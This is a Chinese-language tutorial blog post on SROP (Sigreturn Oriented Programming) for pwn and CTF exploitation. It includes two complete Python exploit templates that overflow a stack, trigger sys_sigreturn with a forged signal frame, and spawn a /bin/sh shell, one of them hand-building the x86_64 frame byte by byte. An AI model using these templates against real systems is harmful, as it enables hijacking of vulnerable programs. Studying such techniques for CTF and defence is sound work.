---
title: "SROP 利用技术"
date: 2025-06-10
categories:
  - 二进制安全
  - ROP
tags:
  - pwn
  - SROP
  - ROP
---

`pwntools` 里面有这个类：`SigreturnFrame()`。它能自动帮你生成对应架构下完美的、对齐的伪造栈帧字节流。  

```python
from pwn import *

# 1. 初始化环境配置 (极其重要，SigreturnFrame 依赖它来决定结构体大小)
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# --- 假设我们已经找到的地址常量 ---
offset = 40                    # 覆盖到返回地址所需的垃圾数据长度
syscall_ret = 0x401150         # syscall; ret; 的地址
set_rax_15_ret = 0x401160      # 假设存在的 gadget: mov rax, 15; ret
bin_sh_addr = 0x402000         # "/bin/sh" 字符串的地址

io = process('./vuln_program')

# ==========================================
# [ SROP 核心伪造区 ]
# ==========================================
# 2. 实例化一个空的信号帧
frame = SigreturnFrame()

# 3. 像填表一样，填入你期望的寄存器最终状态
# 我们想要执行: execve("/bin/sh", NULL, NULL)
frame.rax = 59              # 59 是 execve 的系统调用号
frame.rdi = bin_sh_addr     # 第一个参数: 指向 "/bin/sh"
frame.rsi = 0               # 第二个参数: NULL
frame.rdx = 0               # 第三个参数: NULL

# 4. 最关键的一步：现场恢复后，程序接着去哪执行？
# 既然寄存器已经准备好执行 execve 了，我们必须让 RIP 再次指向 syscall 去触发它
frame.rip = syscall_ret     

# ==========================================
# [ 组装 Payload 区 ]
# ==========================================
# 第一部分：常规的栈溢出垃圾数据
payload = b'A' * offset

# 第二部分：触发 sys_sigreturn
# 也就是让 RAX=15，然后执行 syscall
payload += p64(set_rax_15_ret) 
payload += p64(syscall_ret)

# 第三部分：紧跟其后，放上我们伪造的庞大 Signal Frame
# sys_sigreturn 执行时，会直接把紧挨着它的这块数据当成现场进行恢复
payload += bytes(frame)

# ==========================================
# [ 发送与接管 ]
# ==========================================
print("[+] Sending SROP Payload...")
io.sendline(payload)

# 享受你的 Shell
io.interactive()
```

SROP (Sigreturn Oriented Programming) 的本质，是**利用操作系统内核（Kernel）对栈数据的“盲目信任”**。

#### 1. 正常的信号处理流程
假设你的程序正在运行，突然产生了一个异常（比如你按了 Ctrl+C 触发了 `SIGINT`），或者定时器到了（`SIGALRM`）。系统是怎么处理的？

1. **打断执行，保存现场：** 内核（Kernel）会强行暂停你的程序。为了等会儿能恢复，内核会把你当前所有的 CPU 寄存器（RAX, RDI, RIP, RSP, 段寄存器等）全部打包，**推到你的用户态栈（User Stack）上**。这个巨大的数据包，就是 **Signal Frame（信号帧）**。
2. **执行处理函数：** 内核把 `RIP` 指向对应的信号处理函数去执行。
3. **恢复现场 (**`**sigreturn**`**)：** 处理结束后，程序会调用一个特殊的系统调用 `sys_sigreturn`（64位下调用号是 15）。内核收到这个调用后，会去栈上把刚才存的 Signal Frame 拿出来，**然后塞回所有的硬件寄存器里**，程序就像什么都没发生一样继续运行。

#### 2. 逻辑漏洞
一个致命的逻辑漏洞：**内核在执行 **`**sys_sigreturn**`** 恢复现场时，根本不检查栈上的 Signal Frame 是不是原来自己保存的那个！**

只要你：

1. 用栈溢出，在栈上填满一个**伪造的 Signal Frame**。
2. 想办法让 `RAX = 15`。
3. 执行 `syscall` 指令。

内核会把伪造的数据当成合法的现场，原封不动地塞进 CPU 的每一个寄存器。

### 什么时候不能用 `SigreturnFrame()`？
`pwntools` 的 `SigreturnFrame()` 

1. **无 Python/无 pwntools 环境：** 实战打某些内网机器，或者写 C 语言的 Exploit 时，只能依靠底层的结构体和系统调用，不能依赖 Python 库。
2. **特殊架构或老旧内核：**`pwntools` 里的结构体模板是固定的（基于较新的主流 Linux）。遇到偏门的 MIPS 路由器，或者魔改过内核的 IoT 设备，它的帧结构偏移是对不上的，用 `pwntools` 生成发过去直接段错误。
3. **栈空间极其有限：** 64 位下的一个完整 Signal Frame 长达 **248 字节**。如果程序的溢出长度只有 100 字节怎么办？ 用不了 `SigreturnFrame()`！这时候我们需要“**部分伪造**”——只精准覆盖前几个关键寄存器（如 RDI, RSI, RIP），后面利用栈上原有的残余数据碰运气，这种骚操作只能手写。我觉得也能栈迁移继续写
4. **绕过沙箱 (Bypass Seccomp)：** 有时候你需要在一个帧里嵌套另一个帧，或者利用帧的某些未定义字段，直接利用库函数无法修改这些

手搓信号帧，是**根据 Linux 内核源码中的 **`**ucontext_t**`** 结构体，对着偏移量在特定的字节位置填入你想要的值。**

#### 1. 设置好段寄存器 
手写最容易失败的原因在于：**你必须提供合法的段寄存器（CS, SS 等）**。 在 64 位 Linux 下：

+ 代码段寄存器 `**CS**`** 必须是 **`**0x33**`
+ 栈段寄存器 `**SS**`** 必须是 **`**0x2b**`

如果这两个值是 0，`sys_sigreturn` 恢复上下文后，CPU 在用户态一切换，立刻因为权限异常触发 `Segmentation Fault`段错误。

手写模板

```python
#!/usr/bin/env python3
from pwn import *
import struct

# ==========================================
# [ 1. 核心武器库：手搓 Signal Frame ]
# ==========================================
class HandcraftedSigFrame:
    """
    纯手工构建 64 位 Linux ucontext_t 结构体
    总长度: 248 bytes (0xf8)
    """
    def __init__(self):
        # 初始化 248 字节的 0 (内核其实不关心没有用到的字段)
        self.frame = bytearray(b'\x00' * 248)
        
        # --- 设置一些极其关键的默认值 (防止内核恢复现场时崩溃) ---
        # 1. eflags: 必须包含合法标志，0x202 (IF, 中断允许标志位开启) 是最稳妥的
        self.set_reg('eflags', 0x202)
        
        # 2. 段寄存器 (Segment Registers): x86_64 下的死规定
        # 如果 CS != 0x33，CPU 会瞬间抛出权限异常 (General Protection Fault)
        self.frame[0xb8:0xba] = struct.pack('<H', 0x33) # CS = 0x33
        self.frame[0xba:0xbc] = struct.pack('<H', 0x00) # GS = 0
        self.frame[0xbc:0xbe] = struct.pack('<H', 0x00) # FS = 0
        self.frame[0xbe:0xc0] = struct.pack('<H', 0x2b) # SS = 0x2b

    def set_reg(self, reg_name, val):
        """
        根据 Linux 内核源码的偏移量，精准覆写 8 字节寄存器
        """
        offsets = {
            'r8': 0x28,  'r9': 0x30,  'r10': 0x38, 'r11': 0x40,
            'r12': 0x48, 'r13': 0x50, 'r14': 0x58, 'r15': 0x60,
            'rdi': 0x68, 'rsi': 0x70, 'rbp': 0x78, 'rbx': 0x80,
            'rdx': 0x88, 'rax': 0x90, 'rcx': 0x98, 'rsp': 0xa0,
            'rip': 0xa8, 'eflags': 0xb0
        }
        if reg_name in offsets:
            offset = offsets[reg_name]
            # <Q 代表小端序, 8 字节无符号整数 (64位机器标准)
            self.frame[offset:offset+8] = struct.pack('<Q', val)
        else:
            raise ValueError(f"Unknown register: {reg_name}")

    def build(self):
        return bytes(self.frame)

# ==========================================
# [ 2. 全局环境与偏移配置 ]
# ==========================================
# 这里仅使用 pwntools 进行网络通信和 ELF 解析
context.arch = 'amd64'
context.log_level = 'debug'

# 目标程序 (这里假设漏洞程序名为 vuln)
# io = process('./vuln')
# io = remote('127.0.0.1', 1337)

# --- 假设我们前期收集到的地址和 Gadget ---
# (实战中你需要用 ROPgadget 工具或者 ELF() 去找这些地址)
padding_size = 40                  # 栈溢出覆盖到 ret 所需的垃圾数据长度
syscall_ret = 0x401150             # `syscall; ret;` 的地址
set_rax_15_ret = 0x401160          # 假设的触发 Gadget: `mov rax, 15; ret;`
bin_sh_addr = 0x402000             # 字符串 "/bin/sh" 所在的内存地址

# ==========================================
# [ 3. 构造与执行攻击 ]
# ==========================================
def pwn():
    print("[+] 正在手动组装 Signal Frame...")
    frame = HandcraftedSigFrame()
    
    # 填表时间：布置我们期望的寄存器状态 (目标：execve("/bin/sh", 0, 0))
    frame.set_reg('rax', 59)            # 59 是 execve 的调用号
    frame.set_reg('rdi', bin_sh_addr)   # 参数 1: "/bin/sh" 字符串指针
    frame.set_reg('rsi', 0)             # 参数 2: NULL
    frame.set_reg('rdx', 0)             # 参数 3: NULL
    frame.set_reg('rip', syscall_ret)   # [关键]: 现场恢复后，立即执行 syscall

    # 可选：如果你需要做连环 ROP，可以把 RSP 劫持到一个新的可控地址
    # frame.set_reg('rsp', 0x403000) 

    # 组装完整的恶意 Payload
    payload = b'A' * padding_size       # 1. 垃圾数据，填满溢出空间
    payload += p64(set_rax_15_ret)      # 2. 控制 RAX = 15 (sys_sigreturn)
    payload += p64(syscall_ret)         # 3. 触发系统调用，内核开始去栈上取假现场
    payload += frame.build()            # 4. 纯手工捏造的 248 字节假现场紧随其后

    print("[+] Payload 组装完毕，长度:", len(payload))
    print("[+] 正在发送 Payload 接管控制流...")
    
    # io.sendline(payload)
    # io.interactive()

if __name__ == '__main__':
    pwn()
```